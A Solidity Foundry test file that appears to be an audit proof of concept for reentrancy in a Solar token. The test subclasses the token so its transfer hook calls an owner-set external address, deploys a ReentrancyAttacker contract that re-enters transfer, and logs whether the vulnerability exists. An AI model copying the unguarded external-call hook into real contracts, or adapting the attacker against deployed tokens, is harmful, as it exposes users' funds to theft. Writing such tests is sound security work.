// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/Solar.sol";

contract SolarReentrant is Solar {
    address public callbackAddress;

    constructor() Solar() public {}

    function setCallbackAddress(address _address) external onlyOwner {
        callbackAddress = _address;
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
        super._beforeTokenTransfer(from, to, amount);

        if (callbackAddress != address(0)) {
            (bool success, ) = callbackAddress.call(
                abi.encodeWithSignature("doCallback()")
            );
            require(success, "Reentrant callback failed");
        }
    }
}

contract ReentrancyAttacker {
    SolarReentrant public token;
    address public victim1;
    address public victim2;
    bool public attacking;

    constructor(address _token, address _victim1, address _victim2) public {
        token = SolarReentrant(_token);
        victim1 = _victim1;
        victim2 = _victim2;
    }

    function startAttack() external {
        attacking = false;
        token.transfer(victim1, 1 ether);
    }

    function doCallback() external {
        if (!attacking) {
            attacking = true;
            token.transfer(victim2, 1 ether);
        }
    }
}

contract SolarReentrancyTest is Test {
    SolarReentrant public token;
    address attacker = address(0x1337);
    address victim1 = address(0x1);
    address victim2 = address(0x2);

    function setUp() public {
        token = new SolarReentrant();
        token.mint(attacker, 100 ether);
    }

    function test_ReentrancyInBeforeTokenTransfer() public {
        // Deploy attacker contract
        ReentrancyAttacker attackerContract = 
            new ReentrancyAttacker(address(token), victim1, victim2);
        
        // Fund attacker contract from initial attacker
        vm.prank(attacker);
        token.transfer(address(attackerContract), 10 ether);
        
        // Set callback address to attacker contract as owner
        token.setCallbackAddress(address(attackerContract));
        
        console.log("--- BEFORE-Trigger Attack ---");
        uint256 victim1BalanceBefore = token.balanceOf(victim1);
        uint256 victim2BalanceBefore = token.balanceOf(victim2);
        uint256 attackerContractBalanceBefore = token.balanceOf(address(attackerContract));
        console.log("Victim1 balance: %s", victim1BalanceBefore);
        console.log("Victim2 balance: %s", victim2BalanceBefore);
        console.log("Attacker contract balance: %s", attackerContractBalanceBefore);

        console.log("--- Trigger Attack: call startAttack ---");
        // Execute attack
        attackerContract.startAttack();
        
        console.log("--- AFTER-Trigger Attack ---");
        uint256 victim1BalanceAfter = token.balanceOf(victim1);
        uint256 victim2BalanceAfter = token.balanceOf(victim2);
        uint256 attackerContractBalanceAfter = token.balanceOf(address(attackerContract));
        console.log("Victim1 balance: %s", victim1BalanceAfter);
        console.log("Victim2 balance: %s", victim2BalanceAfter);
        console.log("Attacker contract balance: %s", attackerContractBalanceAfter);
        
        // Check if attack succeeded through balance patterns
        bool attackSucceeded = 
            victim1BalanceAfter - victim1BalanceBefore == 1 ether && 
            victim2BalanceAfter - victim2BalanceBefore == 1 ether && 
            attackerContractBalanceBefore - attackerContractBalanceAfter == 2 ether;
        
        console.log("--- Differential Check ---");
        if (attackSucceeded) {
            console.log("Vulnerability Exists: Re-entrancy attack succeeded. The token contract allowed a re-entrant transfer during token transfer.");
        } else {
            console.log("Vulnerability not Exist: The attack did not succeed as expected, re-entrancy might have been prevented.");
        }
        
        // Verify reentrant transfers completed
        assertEq(token.balanceOf(victim1), 1 ether, "Victim1 balance incorrect");
        assertEq(token.balanceOf(victim2), 1 ether, "Victim2 balance incorrect");
        assertEq(
            token.balanceOf(address(attackerContract)), 
            8 ether, 
            "Attacker contract balance incorrect after reentrancy"
        );
    }
}